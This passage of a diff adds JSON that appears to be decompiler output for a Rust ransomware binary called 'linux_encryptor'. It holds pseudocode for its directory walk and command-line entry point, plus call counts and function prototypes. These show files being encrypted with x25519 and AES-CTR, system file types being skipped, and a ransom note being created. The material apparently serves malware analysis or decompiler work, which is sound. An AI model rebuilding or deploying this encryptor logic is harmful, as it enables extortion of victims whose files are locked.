!v30 {\n                    v35 = 1;\n                } else {\n                    v35 = __rust_alloc(v30, 1);\n                }\n                memcpy(v35, v32, v30);\n                v4 = v35;\n                v5 = v30;\n                v6 = v30;\n                if v2 {\n                    v35 = v4;\n                    v34 = v6;\n                }\n                v11 = alloc::str::<impl str>::to_lowercase(v35, v34);\n                if core::str::pattern::Pattern::is_contained_in(\".ini\", v11, *((&v11 as &char + 16) as &i64)) as i8 {\n                    v37 = 0;\n                    goto LABEL_40c2a5;\n                }\n                v1 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                if core::str::pattern::Pattern::is_contained_in(\".exe\", v1, v3) as i8 {\nLABEL_40c454:\n                    v37 = 0;\n                    goto LABEL_40c457;\n                } else {\n                    v1 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                    if !(!core::str::pattern::Pattern::is_contained_in(\".dll\", v1, v3) as i8) {\n                        goto LABEL_40c454;\n                    }\n                    v1 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                    if !(!core::str::pattern::Pattern::is_contained_in(\".lnk\", v1, v3) as i8) {\n                        goto LABEL_40c454;\n                    }\n                    v7 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                    v17 = v7;\n                    v0 = core::str::converts::from_utf8(\"Luna\");\n                    if v1 {\n                        *(&v18 as &i128) = *((&v0 as &char + 8) as &i128);\n                        core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v18, &g_473eb0, \"src/files.rs\"); /* do not return */\n                    }\n                    v1 = alloc::str::<impl str>::to_lowercase(v2, v3);\n                    v37 = core::str::pattern::Pattern::is_contained_in(v1, v3, v17, v9) as i32 & 0xffffffffffffff00 | core::str::pattern::Pattern::is_contained_in(v1, v3, v17, v9) as i32 ^ 1;\nLABEL_40c457:\nLABEL_40c2a5:\n                    v22 = &v1;\n                    if v37 {\n                        if v14 as i64 {\n                            v0 = struct8 {\n                                field_0: &v14\n                            };\n                            core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v0, &g_473e90, \"src/files.rs\"); /* do not return */\n                        }\n                        v7 = std::fs::DirEntry::path(&v14);\n                        v11 = v7;\n                        println!(\"Encrypting file: {}\", &v11);\n                        linux_encryptor::files::add_file();\n                    }\nLABEL_40c1b3:\n                    if !(!v14 as i64) {\n                        continue;\n                    }\n                    v41 = (&v14)[8] as i64;\n                    v42 = *(v41 as &i64);\n                    *(v41 as &unsigned long) = v42 - 1;\n                    if BinaryOp CasCmpNE {\n                        goto LABEL_0x40c1ca;\n                    }\n                    if v42 == 1 {\n                        alloc::sync::Arc<T>::drop_slow(&v14);\n                    }\n                    *(v16 as i64 as &i8) = 0;\n                    if (&v16)[8] as i64 {\n                        break;\n                    }\n                }\n            }\n        }\n    }\n}\n",
+    "_ZN15linux_encryptor4main17h4012ebd29c92ad43E": "fn linux_encryptor::main() -> u64 {\n    let v0: i64;  // [sp-0xc8], Other Possible Types: struct32\n    let v1: i64;  // [sp-0xc0]\n    let v2: i64;  // [sp-0xb8]\n    let v3: Arguments;  // [sp-0x90]\n    let v4: i64;  // [sp-0x60]\n    let v5: i64;  // [sp-0x58]\n    let v6: i64;  // [sp-0x50]\n    let v7: struct24;  // [sp-0x48]\n    let v12: iNone;  // xmm0\n    let v13: i64;  // r12\n    let v14: i64;  // rbp\n    let v15: i64;  // r14\n    let v16: i64;  // r13\n    let v17: i64;  // r15\n    let v18: i64;  // r13\n    let v19: i64;  // rax\n    let v20: i64;  // rax\n    let v21: i64;  // rbp\n    let v22: i64;  // r12\n    let v23: i64;  // rsi\n    let v24: i64;  // rbp\n    let v25: i64;  // r12\n    let v26: i64;  // rbp\n    let v27: i64;  // r12\n    let v28: i64;  // r12\n    let v29: i64;  // rbx\n    let v30: i64;  // rbp\n    let v32: i64;  // rax\n\n    v3 = std::env::args();\n    v12 = *(&v3.pieces.ptr as &i128);\n    v0 = struct32 {\n        field_0: v12\n        field_16: v3.fmt\n    };\n    v7 = <alloc::vec::Vec<T> as alloc::vec::spec_from_iter::SpecFromIter<T,I>>::from_iter(&v0);\n    v13 = v7.field_0;\n    v14 = *((&v7.field_8 as &char + 8) as &i64);\n    if v14 {\n        v15 = v13 + 24;\n        v4 = v14 * 8;\n        v16 = v4 * 3;\n        v17 = 0;\n        v6 = v13;\n        v5 = v14;\n        do {\n            v18 = v16;\n            v17 += 1;\n            v19 = *((v15 - 8) as &i64);\n            if v19 == 5 {\n                v20 = *((v15 - 24) as &i64);\n                if !(!(*((v20 + 4) as &i8) ^ 112)) || !(!(*(v20 as &i32) ^ 1818585133)) {\n                    v21 = v14;\n                    v22 = v13;\n                    if !(*((v20 + 4) as &i8) ^ 101) && !(*(v20 as &i32) ^ 1818846765) {\n                        if !std::path::Path::is_file() as i8 {\n                            println!(\"Error {} isn't file!\", v15);\n                            v21 = v14;\n                            v22 = v13;\n                        } else {\n                            println!(\"{} {} {} encrypting\", v13, v15 - 24, v15);\n                            v23 = *(v15 as &i64);\n                            v24 = *((v15 + 16) as &i64);\n                            if !v24 {\n                                v25 = 1;\n                            } else {\n                                v25 = __rust_alloc(v24, 1);\n                            }\n                            memcpy(v25, v23, v24);\n                            v0 = v25;\n                            v1 = v24;\n                            v2 = v24;\n                            linux_encryptor::files::add_file();\n                            v21 = v5;\n                            v22 = v6;\n                            if v1 {\n                                v5 = v5;\n                                v6 = v6;\n                            }\n                        }\n                    }\n                    v13 = v22;\n                    v14 = v21;\n                    v19 = *((v15 - 8) as &i64);\n                } else {\n                    println!(\"How to use:\");\n                    println!(\"{} -file /home/user/Desktop/file.txt (Encrypts file.txt in /home/user/Desktop directory)\", v13);\n                    println!(\"{} -dir /home/user/Desktop/ (Encrypts /home/user/Desktop/ directory)\", v13);\n                    goto LABEL_40e211;\n                }\n            }\n            v26 = v14;\n            v27 = v13;\n            if v19 == 4 {\n                v26 = v14;\n                v27 = v13;\n                if *(*((v15 - 24) as &i64) as &i32) == 1919509549 {\n                    if !std::path::Path::is_dir() as i8 {\n                        println!(\"Error {} isn't directory!\", v15);\n                        v26 = v14;\n                        v27 = v13;\n                    } else {\n                        println!(\"{} {} {} encrypting\", v13, v15 - 24, v15);\n                        v28 = *(v15 as &i64);\n                        v29 = *((v15 + 16) as &i64);\n                        if !v29 {\n                            v30 = 1;\n                        } else {\n                            v30 = __rust_alloc(v29, 1);\n                        }\n                        memcpy(v30, v28, v29);\n                        v0 = v30;\n                        v1 = v29;\n                        v2 = v29;\n                        linux_encryptor::files::walk_dir(&v0);\n                        v26 = v5;\n                        v27 = v6;\n                        if v1 {\n                            v5 = v5;\n                            v6 = v6;\n                        }\n                    }\n                }\n            }\n            v13 = v27;\n            v14 = v26;\n            v15 += 24;\n            v16 = v18 - 24;\n        } while (v18 != 24);\n        if v14 == 1 {\n            println!(\"How to use:\");\n            println!(\"{} -file /home/user/Desktop/file.txt (Encrypts file.txt in /home/user/Desktop directory)\", v13);\n            println!(\"{} -dir /home/user/Desktop/ (Encrypts /home/user/Desktop/ directory)\", v13);\n        } else {\n            goto LABEL_40e291;\n        }\nLABEL_40e211:\n    }\nLABEL_40e291:\n    v32 = v7.field_8 as i64;\n    if v32 {\n        v32 = (v32 * 24) as u64;\n    }\n    return v32;\n}\n"
+  },
+  "function_call_counts": {
+    "_ZN15linux_encryptor5files8add_file17h9f8ecb31ebca83c0E": {
+      "core::result::unwrap_failed": 14,
+      "std::sys::unix::fs::rename": 1,
+      "memcpy": 2,
+      "alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle": 2,
+      "core::str::converts::from_utf8": 1,
+      "<alloc::string::String as core::clone::Clone>::clone": 1,
+      "std::os::unix::net::datagram::UnixDatagram::send": 5,
+      "<std::fs::File as std::io::Seek>::seek": 8,
+      "<std::process::ChildStdout as std::io::Read>::read": 3,
+      "memset": 7,
+      "__rust_alloc": 6,
+      "core::panicking::panic": 1,
+      "crypto::aes::ctr": 1,
+      "x25519_dalek::x25519::_DERIVE_Drop_FOR_EphemeralSecret::<impl core::ops::drop::Drop for x25519_dalek::x25519::EphemeralSecret>::drop": 1,
+      "x25519_dalek::x25519::_DERIVE_zeroize_Zeroize_FOR_SharedSecret::<impl zeroize::Zeroize for x25519_dalek::x25519::SharedSecret>::zeroize": 1,
+      "curve25519_dalek::montgomery::MontgomeryPoint::to_bytes": 2,
+      "x25519_dalek::x25519::StaticSecret::diffie_hellman": 1,
+      "<x25519_dalek::x25519::PublicKey as core::convert::From<[u8; 32]>>::from": 1,
+      "<base64_stream::from_base64_reader::FromBase64Reader<R,N> as std::io::Read>::read": 1,
+      "<x25519_dalek::x25519::PublicKey as core::convert::From<&x25519_dalek::x25519::EphemeralSecret>>::from": 1,
+      "x25519_dalek::x25519::clamp_scalar": 1,
+      "std::fs::Metadata::len": 1,
+      "<rand_core::os::OsRng as rand_core::RngCore>::fill_bytes": 1,
+      "std::fs::File::metadata": 1,
+      "std::fs::OpenOptions::_open": 1,
+      "std::fs::OpenOptions::write": 1,
+      "std::fs::OpenOptions::read": 1,
+      "std::fs::File::options": 1
+    },
+    "_ZN15linux_encryptor5files11create_note17hd3c91fc90c0b0684E": {
+      "core::result::unwrap_failed": 2,
+      "core::panicking::panic": 8,
+      "std::fs::write": 1,
+      "<base64_stream::from_base64_reader::FromBase64Reader<R,N> as std::io::Read>::read": 1,
+      "memset": 1,
+      "__rust_alloc_zeroed": 1,
+      "alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle": 3,
+      "memcpy": 1,
+      "core::str::converts::from_utf8": 1,
+      "<alloc::string::String as core::clone::Clone>::clone": 1
+    },
+    "_ZN15linux_encryptor5files8walk_dir17h3bbd2a8a81e3b38eE": {
+      "alloc::sync::Arc<T>::drop_slow": 2,
+      "linux_encryptor::files::add_file": 1,
+      "std::fs::DirEntry::path": 5,
+      "core::result::unwrap_failed": 6,
+      "core::str::pattern::Pattern::is_contained_in": 4,
+      "alloc::str::<impl str>::to_lowercase": 13,
+      "core::str::converts::from_utf8": 1,
+      "memcpy": 2,
+      "__rust_alloc": 2,
+      "core::panicking::panic": 2,
+      "std::sys::unix::os_str::Slice::to_str": 2,
+      "linux_encryptor::files::walk_dir": 1,
+      "alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle": 1,
+      "<alloc::string::String as core::clone::Clone>::clone": 1,
+      "<std::fs::ReadDir as core::iter::traits::iterator::Iterator>::next": 1,
+      "linux_encryptor::files::create_note": 1
+    },
+    "_ZN15linux_encryptor4main17h4012ebd29c92ad43E": {
+      "linux_encryptor::files::walk_dir": 1,
+      "memcpy": 2,
+      "__rust_alloc": 2,
+      "linux_encryptor::files::add_file": 1,
+      "<alloc::vec::Vec<T> as alloc::vec::spec_from_iter::SpecFromIter<T,I>>::from_iter": 1,
+      "std::env::args": 1
+    }
+  },
+  "macro_call_counts": {
+    "_ZN15linux_encryptor5files8add_file17h9f8ecb31ebca83c0E": {
+      "println": 6
+    },
+    "_ZN15linux_encryptor5files11create_note17hd3c91fc90c0b0684E": {
+      "println": 1
+    },
+    "_ZN15linux_encryptor5files8walk_dir17h3bbd2a8a81e3b38eE": {
+      "println": 1
+    },
+    "_ZN15linux_encryptor4main17h4012ebd29c92ad43E": {
+      "println": 10
+    }
+  },
+  "node_counts": {
+    "_ZN15linux_encryptor5files8add_file17h9f8ecb31ebca83c0E": 106,
+    "_ZN15linux_encryptor5files11create_note17hd3c91fc90c0b0684E": 63,
+    "_ZN15linux_encryptor5files8walk_dir17h3bbd2a8a81e3b38eE": 77,
+    "_ZN15linux_encryptor4main17h4012ebd29c92ad43E": 43
+  },
+  "prototypes": {
+    "_ZN5alloc7raw_vec19RawVec$LT$T$C$A$GT$7reserve21do_reserve_and_handle17h0efe5460ba49e6e2E": {
+      "name": "_ZN5alloc7raw_vec19RawVec$LT$T$C$A$GT$7reserve21do_reserve_and_handle17h0efe5460ba49e6e2E",
+      "return_type": [
+        "struct",
+        16
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN5alloc5alloc18handle_alloc_error17h17f9e80a43aee885E": {
+      "name": "_ZN5alloc5alloc18handle_alloc_error17h17f9e80a43aee885E",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": []
+    },
+    "_ZN4core9panicking5panic17h8705e81f284be8a5E": {
+      "name": "_ZN4core9panicking5panic17h8705e81f284be8a5E",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN4core6result13unwrap_failed17hddd78f4658ac7d0fE": {
+      "name": "_ZN4core6result13unwrap_failed17hddd78f4658ac7d0fE",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "struct*",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E": {
+      "name": "_ZN4core3str7pattern7Pattern15is_contained_in17h7ff10870f2c331f7E",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN15linux_encryptor5files8add_file17h9f8ecb31ebca83c0E": {
+      "name": "_ZN15linux_encryptor5files8add_file17h9f8ecb31ebca83c0E",
+      "return_type": [
+        "primitive",
+        4
+      ],
+      "parameters": []
+    },
+    "_ZN15linux_encryptor5files11create_note17hd3c91fc90c0b0684E": {
+      "name": "_ZN15linux_encryptor5files11create_note17hd3c91fc90c0b0684E",
+      "return_type": [
+        "primitive",
+        4
+      ],
+      "parameters": []
+    },
+    "_ZN15linux_encryptor5files8walk_dir17h3bbd2a8a81e3b38eE": {
+      "name": "_ZN15linux_encryptor5files8walk_dir17h3bbd2a8a81e3b38eE",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN5alloc4sync12Arc$LT$T$GT$9drop_slow17hbfdcf0b3892a7d2aE": {
+      "name": "_ZN5alloc4sync12Arc$LT$T$GT$9drop_slow17hbfdcf0b3892a7d2aE",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN15linux_encryptor4main17h4012ebd29c92ad43E": {
+      "name": "_ZN15linux_encryptor4main17h4012ebd29c92ad43E",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": []
+    },
+    "_ZN98_$LT$base64_stream..from_base64_reader..FromBase64Reader$LT$R$C$N$GT$$u20$as$u20$std..io..Read$GT$4read17hb3c702596d042c13E": {
+      "name": "_ZN98_$LT$base64_stream..from_base64_reader..FromBase64Reader$LT$R$C$N$GT$$u20$as$u20$std..io..Read$GT$4read17hb3c702596d042c13E",
+      "return_type": [
+        "struct",
+        16
+      ],
+      "parameters": [
+        [
+          "struct*",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN98_$LT$alloc..vec..Vec$LT$T$GT$$u20$as$u20$alloc..vec..spec_from_iter..SpecFromIter$LT$T$C$I$GT$$GT$9from_iter17h29f4c2317536a009E": {
+      "name": "_ZN98_$LT$alloc..vec..Vec$LT$T$GT$$u20$as$u20$alloc..vec..spec_from_iter..SpecFromIter$LT$T$C$I$GT$$GT$9from_iter17h29f4c2317536a009E",
+      "return_type": [
+        "struct",
+        24
+      ],
+      "parameters": [
+        [
+          "struct*",
+          8
+        ]
+      ]
+    },
+    "__rust_alloc": {
+      "name": "__rust_alloc",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "__rust_alloc_zeroed": {
+      "name": "__rust_alloc_zeroed",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN103_$LT$x25519_dalek..x25519..PublicKey$u20$as$u20$core..convert..From$LT$$u5b$u8$u3b$$u20$32$u5d$$GT$$GT$4from17h7cab22afea86b4bcE": {
+      "name": "_ZN103_$LT$x25519_dalek..x25519..PublicKey$u20$as$u20$core..convert..From$LT$$u5b$u8$u3b$$u20$32$u5d$$GT$$GT$4from17h7cab22afea86b4bcE",
+      "return_type": [
+        "struct",
+        32
+      ],
+      "parameters": [
+        [
+          "struct*",
+          8
+        ]
+      ]
+    },
+    "_ZN12x25519_dalek6x2551912StaticSecret14diffie_hellman17h67523ff67070ee4aE": {
+      "name": "_ZN12x25519_dalek6x2551912StaticSecret14diffie_hellman17h67523ff67070ee4aE",
+      "return_type": [
+        "struct",
+        32
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN120_$LT$x25519_dalek..x25519..PublicKey$u20$as$u20$core..convert..From$LT$$RF$x25519_dalek..x25519..EphemeralSecret$GT$$GT$4from17he281c90061a388daE": {
+      "name": "_ZN120_$LT$x25519_dalek..x25519..PublicKey$u20$as$u20$core..convert..From$LT$$RF$x25519_dalek..x25519..EphemeralSecret$GT$$GT$4from17he281c90061a388daE",
+      "return_type": [
+        "struct",
+        32
+      ],
+      "parameters": [
+        [
+          "struct*",
+          8
+        ]
+      ]
+    },
+    "_ZN12x25519_dalek6x2551912clamp_scalar17hc83d8d312a5ba984E": {
+      "name": "_ZN12x25519_dalek6x2551912clamp_scalar17hc83d8d312a5ba984E",
+      "return_type": [
+        "struct",
+        34
+      ],
+      "parameters": [
+        [
+          "struct*",
+          8
+        ]
+      ]
+    },
+    "_ZN12x25519_dalek6x2551932_DERIVE_Drop_FOR_EphemeralSecret89_$LT$impl$u20$core..ops..drop..Drop$u20$for$u20$x25519_dalek..x25519..EphemeralSecret$GT$4drop17h5ad457619b311fecE": {
+      "name": "_ZN12x25519_dalek6x2551932_DERIVE_Drop_FOR_EphemeralSecret89_$LT$impl$u20$core..ops..drop..Drop$u20$for$u20$x25519_dalek..x25519..EphemeralSecret$GT$4drop17h5ad457619b311fecE",
+      "return_type": [
+        "struct",
+        32
+      ],
+      "parameters": []
+    },
+    "_ZN12x25519_dalek6x2551940_DERIVE_zeroize_Zeroize_FOR_SharedSecret81_$LT$impl$u20$zeroize..Zeroize$u20$for$u20$x25519_dalek..x25519..SharedSecret$GT$7zeroize17h6df515ff054eb0e3E": {
+      "name": "_ZN12x25519_dalek6x2551940_DERIVE_zeroize_Zeroize_FOR_SharedSecret81_$LT$impl$u20$zeroize..Zeroize$u20$for$u20$x25519_dalek..x25519..SharedSecret$GT$7zeroize17h6df515ff054eb0e3E",
+      "return_type": [
+        "struct",
+        32
+      ],
+      "parameters": []
+    },
+    "_ZN16curve25519_dalek10montgomery15MontgomeryPoint8to_bytes17h16a036e8efe08c9eE": {
+      "name": "_ZN16curve25519_dalek10montgomery15MontgomeryPoint8to_bytes17h16a036e8efe08c9eE",
+      "return_type": [
+        "struct",
+        32
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN59_$LT$rand_core..os..OsRng$u20$as$u20$rand_core..RngCore$GT$10fill_bytes17h05d0c8f222479ec2E": {
+      "name": "_ZN59_$LT$rand_core..os..OsRng$u20$as$u20$rand_core..RngCore$GT$10fill_bytes17h05d0c8f222479ec2E",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "struct*",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN3std2fs4File7options17h701451fe939867ffE": {
+      "name": "_ZN3std2fs4File7options17h701451fe939867ffE",
+      "return_type": [
+        "struct",
+        14
+      ],
+      "parameters": []
+    },
+    "_ZN3std2fs4File8metadata17hcd1b310905489c6dE": {
+      "name": "_ZN3std2fs4File8metadata17hcd1b310905489c6dE",
+      "return_type": [
+        "Result",
+        48
+      ],
+      "parameters": [
+        [
+          "struct*",
+          8
+        ]
+      ]
+    },
+    "_ZN59_$LT$std..process..ChildStdout$u20$as$u20$std..io..Read$GT$4read17h145aaf2317f1234eE": {
+      "name": "_ZN59_$LT$std..process..ChildStdout$u20$as$u20$std..io..Read$GT$4read17h145aaf2317f1234eE",
+      "return_type": [
+        "struct",
+        16
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN47_$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$4seek17h61858ed814c9e35bE": {
+      "name": "_ZN47_$LT$std..fs..File$u20$as$u20$std..io..Seek$GT$4seek17h61858ed814c9e35bE",
+      "return_type": [
+        "struct",
+        16
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "struct*",
+          8
+        ]
+      ]
+    },
+    "_ZN3std2fs11OpenOptions5_open17h5872a79563820f96E": {
+      "name": "_ZN3std2fs11OpenOptions5_open17h5872a79563820f96E",
+      "return_type": [
+        "Result",
+        12
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN75_$LT$std..fs..ReadDir$u20$as$u20$core..iter..traits..iterator..Iterator$GT$4next17hfa8168d00a87d0deE": {
+      "name": "_ZN75_$LT$std..fs..ReadDir$u20$as$u20$core..iter..traits..iterator..Iterator$GT$4next17hfa8168d00a87d0deE",
+      "return_type": [
+        "Option",
+        48
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN3std2fs8DirEntry4path17h836d7a4ec6da8dd4E": {
+      "name": "_ZN3std2fs8DirEntry4path17h836d7a4ec6da8dd4E",
+      "return_type": [
+        "struct",
+        16
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN3std2os4unix3net8datagram12UnixDatagram4send17h0ffe94fa98154168E": {
+      "name": "_ZN3std2os4unix3net8datagram12UnixDatagram4send17h0ffe94fa98154168E",
+      "return_type": [
+        "struct",
+        16
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN3std4path4Path7is_file17h26f29fcceca286a1E": {
+      "name": "_ZN3std4path4Path7is_file17h26f29fcceca286a1E",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN3std4path4Path6is_dir17ha9f0bdbf3023c324E": {
+      "name": "_ZN3std4path4Path6is_dir17ha9f0bdbf3023c324E",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN3std3sys4unix2fs7readdir17hc7a318d57b997c9dE": {
+      "name": "_ZN3std3sys4unix2fs7readdir17hc7a318d57b997c9dE",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN3std3sys4unix6os_str5Slice6to_str17he74c7d893dc6b80fE": {
+      "name": "_ZN3std3sys4unix6os_str5Slice6to_str17he74c7d893dc6b80fE",
+      "return_type": [
+        "primitive",
+        8
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN5alloc3str21_$LT$impl$u20$str$GT$12to_lowercase17h35fae7dd60ec49e2E": {
+      "name": "_ZN5alloc3str21_$LT$impl$u20$str$GT$12to_lowercase17h35fae7dd60ec49e2E",
+      "return_type": [
+        "Option",
+        24
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN60_$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$5clone17h3549ccdcce7dad99E": {
+      "name": "_ZN60_$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$5clone17h3549ccdcce7dad99E",
+      "return_type": [
+        "struct",
+        24
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN4core3str8converts9from_utf817hbf99f44e098525d0E": {
+      "name": "_ZN4core3str8converts9from_utf817hbf99f44e098525d0E",
+      "return_type": [
+        "Result",
+        24
+      ],
+      "parameters": [
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ]
+    }
+  }
+}
